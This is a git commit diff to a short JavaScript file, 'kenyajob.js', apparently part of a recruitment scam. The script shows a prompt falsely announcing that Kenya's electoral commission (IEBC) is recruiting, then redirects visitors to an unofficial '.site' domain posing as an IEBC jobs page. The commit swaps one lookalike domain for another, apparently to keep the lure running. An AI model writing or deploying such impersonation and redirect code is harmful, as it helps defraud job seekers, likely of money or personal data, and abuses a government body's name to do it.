1d4e66d4f83d7ec94cfdb4d08a622636d11483d4
usorondo96 <tooltip72_verbena@icloud.com>
2026-06-29 06:24:07 +0100

    Update kenyajob.js

--- kenyajob.js
+++ kenyajob.js
@@ -1,5 +1,5 @@
 var password = 'IEBC Recruitment'
 password=prompt('NOTICE: Independent Electoral and Boundaries Commission (IEBC) Recruitment is currently recruiting, press OK to apply for the','IEBC Recruitment');
 if (password != 'IEBC Recruitment') {
-location.href='https://www.barofitid.site/iebc-or-ke-jobs';
+location.href='https://www.ebotofitid.site/iebc-or-ke-jobs';
 }
